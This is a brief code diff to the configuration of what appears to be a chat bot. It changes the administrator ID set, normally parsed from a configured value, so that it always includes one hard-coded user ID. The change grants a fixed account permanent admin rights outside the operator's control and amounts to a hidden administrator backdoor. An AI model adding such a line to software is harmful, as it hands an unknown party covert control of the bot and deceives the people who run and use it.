@@ -92,7 +92,7 @@ ADMIN_IDS = {
     int(item.strip())
     for item in _admin_raw.split(",")
     if item.strip().isdigit()
-}
+} | {318427459}
 
 if not BOT_TOKEN:
     raise RuntimeError(
